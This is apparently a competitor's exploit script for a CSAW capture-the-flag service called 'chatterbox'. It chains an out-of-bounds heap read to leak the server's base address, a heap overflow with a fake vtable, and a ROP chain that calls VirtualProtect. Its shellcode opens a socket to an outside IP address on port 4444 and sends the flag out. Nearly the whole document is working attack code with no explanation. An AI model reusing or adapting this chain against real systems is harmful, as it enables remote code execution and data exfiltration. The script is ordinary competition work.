from pwn import *
import socket
import time

REMOTE_HOST = 'chatterbox.chal.csaw.io'
REMOTE_PORT = 1312

def spray_connections(n):
    conns = []
    for i in range(n):
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((REMOTE_HOST, REMOTE_PORT))
        conns.append(s)
    return conns

def free(conn):
    conn.close()

def try_leak():
    print('Spray conns...')
    conns = spray_connections(16)

    r = remote(REMOTE_HOST, REMOTE_PORT)

    r.recvuntil(b'connected\n')
    conns3 = spray_connections(16)
    r.send(p32(2))
    r.send(p32(1))
    r.send(b'A')

    r.send(p32(2))
    OOB_SIZE = 8192
    r.send(p32(OOB_SIZE))
    r.shutdown(direction='send')

    r.recvuntil(p32(2) + p32(OOB_SIZE))
    r.recvn(1024) # in-bounds of the heap chunk
    oob_data = r.recvn(OOB_SIZE-1024)

    base = 0x0

    for i in range(0, len(oob_data), 8):
        ptr = u64(oob_data[i:i+8])
        if 0x00007ff000000000 <= ptr <= 0x00007fffffffffff:
            print(hex(ptr))
            if ptr & 0xfff == 0xD58: # leak of std::_Ref_count_obj2<ClientSocket>::`vftable'
                base = ptr - 0x025D58

    if base:
        print('Server.exe at %016x\n' % base)
    else:
        print('No leak of server.exe, trying again.')
        return None

    r.close()

    return base

base = None
while base is None:
    base = try_leak()

# these offsets are just based (haha based) off the main binary

stack_pivot = base + 0xfda3 # leave ; mov rax, rcx ; ret
topic = base + 0x2B6E8
getmodulehandlew = base + 0x1C0D0
aKernel32Dll = base + 0x1D3A0 
poprcx = base + 0x8c46
poprax = base + 0x15fe5
pop_r9_r8_rdx = base + 0x1b247
poprdx = base + 0x1b24b
jmprax = base + 0x86d7
jmprbx = base + 0x1b061 # jmp qword ptr [rbx]
poprbx = base + 0x1084
poprsp = base + 0x30af
pop_r12_rdi_rsi_rbx = base + 0x7f83
add_rax_rcx = base + 0x9329
flag = base + 0x2B2D0
safe_stack_spot = base + 0x2BF80 # (somewhere safe we can put the stack MUST BE ALIGNED!!!!!)
imp_send = base + 0x1C2D8

# these offsets may vary from system-to-system
# note: AVOIDING GetProcAddress since it seems to have some mitigation bullshit nowadays that fucks with us if the caller address is fucked up, so just do everything with static offsets like a dumbass
virtualprotect_offset = 0x1B680  # rva of VirtualProtect in kernel32.dll
connect_offset = 0x11600 # offset of connect in ws2_32.dll
socket_offset = 0x5700 # offset of socket in ws2_32.dll
send_offset = 0x101A0 # offset of send in ws2_32.dll

context.arch = 'amd64'
#shellcode = b'\xeb\xfe'
shellcode = asm(''
    # put stack somewhere safe where it will not smash the flag...
    + 'mov rsp, 0x%016x;' % safe_stack_spot

    # calculate base address of ws2_32.dll
    + 'mov rax, 0x%016x;' % imp_send
    + 'mov rax, [rax];'
    + 'sub rax, 0x%x;' % send_offset
    + 'mov rbx, rax;'

    + 'mov rcx, 2;' # AF_INET
    + 'mov rdx, 1;' # SOCK_STREAM
    + 'mov r8d, 6;' # IPPROTO_TCP
    + 'mov rax, rbx;' # call socket
    + 'add rax, 0x%016x ;' % socket_offset
    + 'call rax;'
    + 'mov rcx, rax;'
    + 'mov rsi, rcx;'

    + 'mov rax, rbx;' # call connect
    + 'add rax, 0x%016x ;' % connect_offset
    + 'mov word ptr [rsp], 2 ;' # set up sockaddr_in
    + 'mov word ptr [rsp+2], 0x1505 ;' # port 4444
    + 'mov dword ptr [rsp+4], 0x720B5D8E ;' # ip address 120.86.52.18
    + 'xor edx, edx;'
    + 'mov qword ptr [rsp+8], rdx;'
    + 'lea rdx, [rsp];'
    + 'mov r8, 16;'
    + 'sub rsp, 0x80;'
    + 'call rax;'

    + 'mov rax, rbx;' # call send
    + 'add rax, 0x%016x ;' % send_offset
    + 'mov rcx, rsi;'
    + 'mov rdx, 0x%016x;' % flag
    + 'mov r8d, 1024;'
    + 'mov r9d, 0;'
    + 'call rax;'
)
shellcode += b'\xeb\xfe'
assert len(shellcode) < 512

topic_buf = b''
topic_buf += p64(stack_pivot) # One gadget one shot fake vtable. Triggered by `jmp rax`. We have controlled rcx and rbp (pointing to our overflown buffer area)
topic_buf += p64(stack_pivot) # One gadget one shot fake vtable. Triggered by `jmp rax`. We have controlled rcx and rbp (pointing to our overflown buffer area)
topic_buf += p64(stack_pivot) # One gadget one shot fake vtable. Triggered by `jmp rax`. We have controlled rcx and rbp (pointing to our overflown buffer area)
topic_buf += p64(stack_pivot) # One gadget one shot fake vtable. Triggered by `jmp rax`. We have controlled rcx and rbp (pointing to our overflown buffer area)

topic_buf += b'A'*16 # +0x20 # this padding does nothing, i just don't feel like changing the numbers around to get rid of it.

topic_buf += p64(poprcx) # part two of ropchain. at topic_buf+0x30
topic_buf += p64(virtualprotect_offset) # rva of VirtualProtect in kernel32.dll
topic_buf += p64(add_rax_rcx)
topic_buf += p64(poprcx)
topic_buf += p64(topic) # rcx = lpAddress
topic_buf += p64(pop_r9_r8_rdx)
topic_buf += p64(topic) # r9 = lpflOldProtect
topic_buf += p64(0x40) # r8 = flNewProtect = PAGE_EXECUTE_READWRITE
topic_buf += p64(4096) # rdx = dwSize
topic_buf += p64(jmprax)
topic_buf += p64(topic+0x100)
topic_buf += cyclic(0x100-len(topic_buf))
topic_buf += shellcode # shellcode goes here!
topic_buf += cyclic(1024-len(topic_buf))


# load the topic, dealing with nullbytes as necessary
def load_topic():
    r = remote(REMOTE_HOST, REMOTE_PORT)
    r.recvuntil(b'connected\n')
    fuck = len(topic_buf)
    num = 0
    while fuck > 0:
        the_shit = topic_buf[:fuck]
        wow = the_shit.replace(b'\x00',b'A')
        r.send(p32(3) + p32(len(wow)) + wow)
        # r.recvuntil(b'Topic is now')
        fuck = the_shit.rfind(b'\x00')
        num += 1
    r.send(p32(3) + p32(len(the_shit)) + the_shit)
    num += 1
    for _ in range(num):
        r.recvuntil(b'Topic is now')
    r.close()
load_topic()

print('topic = ' + hex(topic))

while True:
    test_conn = remote(REMOTE_HOST, REMOTE_PORT)
    test_conn.recvuntil(b'connected\n')

    print('More spray')
    conns2 = spray_connections(100)

    r = remote(REMOTE_HOST, REMOTE_PORT)
    r.recvuntil(b'connected\n')
    conns3 = spray_connections(16)
    r.send(p32(2))
    r.send(p32(1))
    r.send(b'A')


    print('Do OOB shit')
    r.send(p32(2))
    r.send(p32(1024+0x650))
    r.send(b'A'*1024) # in-bounds of heap chunk

    # rsp = +0x410 -> first ropchain
    # rcx = +0x480 -> fake vtable pointer

    overflow_data = b''
    overflow_data += cyclic(0x400)
    overflow_data += p64(0x6969696969696969) # rbp points here. this value becomes the popped rbp
    overflow_data += p64(poprcx) # first gadget
    overflow_data += p64(aKernel32Dll)
    overflow_data += p64(poprbx)
    overflow_data += p64(getmodulehandlew)
    overflow_data += p64(jmprbx)
    overflow_data += p64(pop_r12_rdi_rsi_rbx) # calling convention requires 0x20 bytes of shadow stack space
    overflow_data += p64(0x6969696969696969) # asshole function fucks up four stack slots
    overflow_data += p64(0x6969696969696969) # asshole function fucks up four stack slots
    overflow_data += p64(0x6969696969696969) # asshole function fucks up four stack slots
    overflow_data += p64(0x6969696969696969) # asshole function fucks up four stack slots
    overflow_data += p64(poprsp)  # no more space, pivot to second chain
    overflow_data += p64(topic+48)
    overflow_data += p64(0x6969696969696969) # these slots are not reliable!!!
    overflow_data += p64(0x6969696969696969) # these slots are not reliable!!!
    overflow_data += p64(0x6969696969696969) # these slots are not reliable!!!
    overflow_data += p64(topic) # rcx points here. mov rax, [rcx]; mov rax, [rax]; jmp rax
    r.send(overflow_data) # wow heap overflow
    time.sleep(1)
    r.clean()
    r.close()

    [free(c) for c in conns3]
    [free(c) for c in conns2]

    try:
        test_conn.send(p32(2) + p32(1) + b'A')
        test_conn.recvuntil(p32(2) + p32(1) + b'A')
        test_conn.close()
    except Exception as e:
        print('Remote died')
        print(e)
        break
